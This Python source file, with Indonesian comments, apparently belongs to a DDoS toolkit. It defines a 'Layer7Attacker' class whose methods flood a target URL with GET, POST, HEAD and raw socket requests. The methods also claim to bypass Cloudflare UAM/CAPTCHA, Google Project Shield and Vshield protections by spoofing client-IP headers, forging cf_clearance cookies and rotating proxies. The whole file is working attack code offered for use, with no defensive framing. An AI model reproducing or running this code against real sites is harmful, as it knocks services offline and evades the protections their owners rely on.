#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import ssl
import random
import time
import threading
import requests
from http.client import HTTPConnection, HTTPSConnection
from urllib.parse import urlparse
import urllib3
from colorama import Fore

from .utils import get_random_useragent, get_random_proxy
from .proxy_engine import ProxyEngine

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Layer7Attacker:
    def __init__(self, target, method, proxy_file=None):
        self.target = target
        self.method = method
        self.parsed_url = urlparse(target)
        
        self.host = self.parsed_url.netloc.split(':')[0]
        self.port = self.parsed_url.port or (443 if self.parsed_url.scheme == 'https' else 80)
        self.path = self.parsed_url.path if self.parsed_url.path else '/'
        
        self.proxy_engine = ProxyEngine(proxy_file) if proxy_file else None
        self.session = requests.Session()
        self.session.verify = False
        
        # Cache untuk performa
        self._cached_headers = None
        self._cached_data = None
        
    def _get_headers(self):
        """Generate random headers"""
        if self._cached_headers:
            return self._cached_headers.copy()
            
        headers = {
            'User-Agent': get_random_useragent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'TE': 'Trailers',
        }
        
        # Tambahkan header tambahan secara random
        extra_headers = [
            ('DNT', '1'),
            ('Pragma', 'no-cache'),
            ('Sec-Fetch-Dest', 'document'),
            ('Sec-Fetch-Mode', 'navigate'),
            ('Sec-Fetch-Site', 'none'),
            ('Sec-Fetch-User', '?1'),
        ]
        
        for header in random.sample(extra_headers, random.randint(2, len(extra_headers))):
            headers[header[0]] = header[1]
            
        self._cached_headers = headers
        return headers.copy()
        
    def _get_post_data(self):
        """Generate random POST data"""
        if self._cached_data:
            return self._cached_data
            
        data = {
            'username': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=8)),
            'password': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*', k=12)),
            'email': f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))}@gmail.com",
            'csrf': ''.join(random.choices('abcdef1234567890', k=32)),
        }
        
        self._cached_data = data
        return data
        
    def _create_socket(self, use_ssl=False):
        """Create socket connection"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        
        try:
            sock.connect((self.host, self.port))
            
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.host)
                
            return sock
        except:
            sock.close()
            return None
            
    def cfb(self):
        """Bypass CloudFlare basic protection"""
        headers = self._get_headers()
        headers.update({
            'CF-Connecting-IP': f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
            'X-Forwarded-For': f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
            'X-Real-IP': f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        })
        
        try:
            if self.parsed_url.scheme == 'https':
                conn = HTTPSConnection(self.host, self.port, timeout=5)
            else:
                conn = HTTPConnection(self.host, self.port, timeout=5)
                
            conn.request("GET", self.path, headers=headers)
            conn.getresponse().read()
            conn.close()
        except:
            pass
            
    def pxcfb(self):
        """Bypass CF with proxy"""
        if not self.proxy_engine:
            return self.cfb()
            
        proxy = self.proxy_engine.get_random_proxy()
        if not proxy:
            return self.cfb()
            
        try:
            proxies = {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}'
            }
            
            headers = self._get_headers()
            headers.update({
                'CF-Connecting-IP': f"172.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                'X-Forwarded-For': f"172.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
            })
            
            self.session.get(self.target, headers=headers, proxies=proxies, timeout=5)
        except:
            pass
            
    def cfreq(self):
        """Bypass CF UAM, CAPTCHA, BFM dengan request"""
        headers = self._get_headers()
        
        # Simulate browser behavior
        headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, sdch',
            'Accept-Language': 'en-US,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
        })
        
        # Add random referer
        referers = [
            'https://www.google.com/',
            'https://www.bing.com/',
            'https://www.yahoo.com/',
            'https://www.facebook.com/',
            'https://www.reddit.com/',
        ]
        headers['Referer'] = random.choice(referers)
        
        try:
            resp = self.session.get(self.target, headers=headers, timeout=5)
            
            # Jika dapat challenge, coba bypass
            if resp.status_code in [403, 429, 503]:
                # Add clearance cookie
                headers['Cookie'] = f'cf_clearance={random.getrandbits(128):x}'
                self.session.get(self.target, headers=headers, timeout=5)
        except:
            pass
            
    def cfsoc(self):
        """Bypass CF dengan socket"""
        sock = self._create_socket(self.parsed_url.scheme == 'https')
        if not sock:
            return
            
        try:
            # Build HTTP request
            request = f"GET {self.path} HTTP/1.1\r\n"
            request += f"Host: {self.host}\r\n"
            request += f"User-Agent: {get_random_useragent()}\r\n"
            request += f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            request += f"Accept-Language: en-US,en;q=0.5\r\n"
            request += f"Accept-Encoding: gzip, deflate\r\n"
            request += f"Connection: keep-alive\r\n"
            request += f"Upgrade-Insecure-Requests: 1\r\n"
            
            # Add CloudFlare bypass headers
            request += f"CF-Connecting-IP: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
            request += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
            request += "\r\n"
            
            sock.send(request.encode())
            sock.recv(1024)
        except:
            pass
        finally:
            try:
                sock.close()
            except:
                pass
                
    def pxsky(self):
        """Bypass Google Project Shield, Vshield, etc with proxy"""
        if not self.proxy_engine:
            return self.sky()
            
        proxy = self.proxy_engine.get_random_proxy()
        if not proxy:
            return self.sky()
            
        try:
            proxies = {
                'http': f'socks5://{proxy}',
                'https': f'socks5://{proxy}'
            }
            
            headers = self._get_headers()
            headers.update({
                'X-Forwarded-Host': self.host,
                'X-Forwarded-Proto': self.parsed_url.scheme,
                'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            })
            
            # Randomize request method
            methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS']
            method = random.choice(methods)
            
            if method in ['POST', 'PUT']:
                self.session.request(method, self.target, headers=headers, 
                                   data=self._get_post_data(), proxies=proxies, timeout=5)
            else:
                self.session.request(method, self.target, headers=headers, 
                                   proxies=proxies, timeout=5)
        except:
            pass
            
    def sky(self):
        """Sky method tanpa proxy"""
        try:
            headers = self._get_headers()
            
            # Add more headers for Sky method
            sky_headers = {
                'X-Requested-With': 'XMLHttpRequest',
                'X-Ajax-Navigation': 'true',
                'X-Is-Ajax': 'true',
                'X-CSRF-Token': ''.join(random.choices('abcdef0123456789', k=32)),
            }
            headers.update(sky_headers)
            
            # Random endpoint
            endpoints = ['/api/v1/users', '/ajax/login', '/wp-admin/admin-ajax.php', 
                        '/graphql', '/api/graphql', '/rest/v1/users']
            
            path = random.choice(endpoints) if random.random() > 0.5 else self.path
            
            if self.parsed_url.scheme == 'https':
                conn = HTTPSConnection(self.host, self.port, timeout=3)
            else:
                conn = HTTPConnection(self.host, self.port, timeout=3)
                
            # Random HTTP method
            methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
            method = random.choice(methods)
            
            if method in ['POST', 'PUT', 'PATCH']:
                conn.request(method, path, body=str(self._get_post_data()), headers=headers)
            else:
                conn.request(method, path, headers=headers)
                
            conn.getresponse().read()
            conn.close()
        except:
            pass
            
    def http2(self):
        """HTTP/2.0 attack (simulated)"""
        try:
            # Using requests with http2 simulation
            headers = self._get_headers()
            headers.update({
                'HTTP2-Settings': 'AAMAAABkAAQAAP__',
                'Upgrade': 'h2c',
                'Connection': 'Upgrade, HTTP2-Settings',
            })
            
            self.session.get(self.target, headers=headers, timeout=3)
        except:
            # Fallback to HTTP/1.1
            try:
                self.session.get(self.target, headers=self._get_headers(), timeout=3)
            except:
                pass
                
    def pxhttp2(self):
        """HTTP/2.0 dengan proxy"""
        self.pxsky()  # Reuse pxsky method
        
    def spoof(self):
        """Spoof attack dengan fake IP"""
        headers = self._get_headers()
        
        # Spoof berbagai header IP
        spoof_headers = {
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'Client-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Client-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Cluster-Client-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'Forwarded': f"for={random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        }
        
        headers.update(spoof_headers)
        
        try:
            self.session.get(self.target, headers=headers, timeout=3)
        except:
            pass
            
    def pxspoof(self):
        """Spoof attack dengan proxy"""
        if not self.proxy_engine:
            return self.spoof()
            
        self.pxsky()  # Reuse dengan proxy
        
    def get(self):
        """Simple GET flood"""
        try:
            self.session.get(self.target, headers=self._get_headers(), timeout=3)
        except:
            pass
            
    def post(self):
        """POST flood dengan random data"""
        try:
            self.session.post(self.target, 
                            headers=self._get_headers(), 
                            data=self._get_post_data(), 
                            timeout=3)
        except:
            pass
            
    def head(self):
        """HEAD request flood"""
        try:
            self.session.head(self.target, headers=self._get_headers(), timeout=3)
        except:
            pass
            
    def soc(self):
        """Raw socket flood"""
        sock = self._create_socket(self.parsed_url.scheme == 'https')
        if not sock:
            return
            
        try:
            # Simple HTTP request
            request = f"GET {self.path} HTTP/1.1\r\n"
            request += f"Host: {self.host}\r\n"
            request += f"User-Agent: {get_random_useragent()}\r\n"
            request += "\r\n"
            
            sock.send(request.encode())
        except:
            pass
        finally:
            try:
                sock.close()
            except:
                pass
                
    def pxraw(self):
        """Proxy raw request"""
        self.pxsky()
        
    def pxsoc(self):
        """Proxy socket"""
        self.pxsky()